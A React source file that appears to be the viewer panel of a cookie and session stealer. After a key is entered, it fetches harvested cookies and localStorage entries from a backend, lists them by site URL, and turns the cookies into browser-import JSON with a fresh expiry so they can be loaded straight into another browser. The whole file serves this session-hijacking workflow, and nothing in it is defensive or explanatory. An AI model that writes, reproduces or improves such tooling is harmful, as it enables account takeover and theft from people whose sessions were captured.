import {useState} from "react";
import Loading from "./loading.jsx";

function App() {

    const API_URL = import.meta.env.VITE_API_URL;

    const [code, setCode] = useState("");
    const [codeIsSet, setCodeIsSet] = useState(false);
    const [cookies, setCookies] = useState([]);
    const [isLoading, setIsLoading] = useState(true);

    const parseCookieData = (data) => {
        if (!data) return {};
        return data.split(";").reduce((acc, current) => {
            const [key, value] = current.split("=").map(item => item?.trim());
            if (key && value) acc[key] = value;
            return acc;
        }, {});
    };

    const parseLocalData = (cookie) => {
        try {
            if (cookie.localData) {
                return JSON.parse(cookie.localData); // Parse if it's a JSON string
            }
        } catch (error) {
            console.error("Error parsing localData:", error);
        }
        return {}; // Return empty object if parsing fails
    };

    const copyToClipboard = (cookie) => {
        const formattedCookies = Object.entries(parseCookieData(cookie.data)).map(([name, value]) => ({
            domain: cookie.url,
            expirationDate: Math.floor(Date.now() / 1000) + 3600,
            hostOnly: true,
            httpOnly: false,
            name,
            path: "/",
            sameSite: cookie.sameSite && ["lax", "no_restriction", "strict", "unspecified"].includes(cookie.sameSite.toLowerCase())
                ? cookie.sameSite.toLowerCase()
                : "unspecified",
            secure: true,
            session: false,
            storeId: null,
            value,
        }));

        const jsonString = JSON.stringify(formattedCookies, null, 2);

        navigator.clipboard.writeText(jsonString)
            .then(() => console.log("Copied JSON to clipboard!"))
            .catch(err => console.error("Failed to copy:", err));
    };

    const copyLocalStorageData = (data) => {
        navigator.clipboard.writeText(data)
            .then(() => console.log("Copied JSON to clipboard!"))
            .catch(err => console.error("Failed to copy:", err));
    }


    const fetchCookies = async () => {
        try {
            const response = await fetch(API_URL, {
                method: "GET",
                headers: {
                    spec: code
                },
            });
            if (!response.ok) throw new Error("Failed to fetch data");

            const data = await response.json();
            const sortedCookies = [...data].sort(
                (a, b) => new Date(b.updatedAt).getTime() - new Date(a.updatedAt).getTime()
            );
            setCookies(sortedCookies);
            console.log({sortedCookies: parseLocalData(sortedCookies[0])})
        } catch (error) {
            console.error("Error fetching data:", error);
        }
    };

    const onSubmit = () => {
        setCodeIsSet(true);
        fetchCookies()
            .then(() => console.log({cookies}))
            .finally(() => setIsLoading(false));

    }

    if (!codeIsSet) {
        return (
            <div className="flex h-[70vh] items-center justify-center">
                <div
                    className="h-[3/4] w-2/3 shadow shadow-md border border-gray-200 p-6 py-9 flex flex-col gap-y-2 rounded-md">
                    Enter Key:
                    <input
                        placeholder="key" className="border rounded-md p-3"
                        onChangeCapture={(e) => setCode(e.target.value)}
                    />
                    <button
                        className="px-4 py-2 bg-gray-600 text-white rounded-md hover:bg-gray-500 cursor-pointer"
                        onClick={onSubmit}>
                        Submit
                    </button>
                </div>
            </div>
        )
    }
    return (
        <div className="p-4 bg-gray-100 min-h-screen">
            <h1 className="text-2xl font-bold text-center mb-4">Stored Cookies & Local Data</h1>

            {isLoading ? (
                <Loading/>
            ) : cookies.length > 0 ? (
                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                    {cookies.map((cookie) => {
                        const parsedCookies = parseCookieData(cookie.data);
                        const localData = parseLocalData(cookie); // Extract localData
                        const localDataString = JSON.stringify(localData, null, 2); // Format for copying

                        return (
                            <div key={cookie._id} className="bg-white shadow-lg rounded-lg p-4">
                                <div className="flex items-center">
                                    <h2 className="text-lg font-semibold">{cookie.url}</h2>
                                    <button
                                        onClick={() => copyToClipboard(cookie)}
                                        className="ml-auto text-white bg-green-500 px-2 py-1 rounded hover:bg-green-600 transition"
                                    >
                                        Copy Cookies
                                    </button>
                                </div>
                                <p className="text-xs text-gray-500">
                                    Updated: {new Date(cookie.updatedAt).toLocaleString()}
                                </p>

                                {/* Display parsed cookies */}
                                <div className="mt-2 text-sm text-gray-700">
                                    <h3 className="font-semibold">Cookies:</h3>
                                    {Object.keys(parsedCookies).length > 0 ? (
                                        <ul>
                                            {Object.entries(parsedCookies).map(([key, value]) => (
                                                <li key={key} className="border-b py-1 truncate">
                                                    <strong>{key}:</strong> {value}
                                                </li>
                                            ))}
                                        </ul>
                                    ) : (
                                        <p>No cookies found</p>
                                    )}
                                </div>

                                {/* Display parsed localStorage data with copy button */}
                                <div className="mt-2 text-sm text-gray-700">
                                    <div className="flex items-center">
                                        <h3 className="font-semibold">Local Storage Data:</h3>
                                        {Object.keys(localData).length > 0 && (
                                            <button
                                                onClick={() => copyLocalStorageData(cookie.localData)}
                                                className="ml-auto text-white bg-blue-500 px-2 py-1 rounded hover:bg-blue-600 transition"
                                            >
                                                Copy LocalStorage
                                            </button>
                                        )}
                                    </div>
                                    {Object.keys(localData).length > 0 ? (
                                        <ul>
                                            {Object.entries(localData).map(([key, value]) => (
                                                <li key={key} className="border-b py-1 truncate">
                                                    <strong>{key}:</strong> {String(value)}
                                                </li>
                                            ))}
                                        </ul>
                                    ) : (
                                        <p>No local storage data found</p>
                                    )}
                                </div>
                            </div>
                        );
                    })}
                </div>
            ) : (
                <div className="flex h-[70vh] items-center justify-center text-2xl font-bold">
                    No cookies found
                </div>
            )}
        </div>
    );
}

export default App;
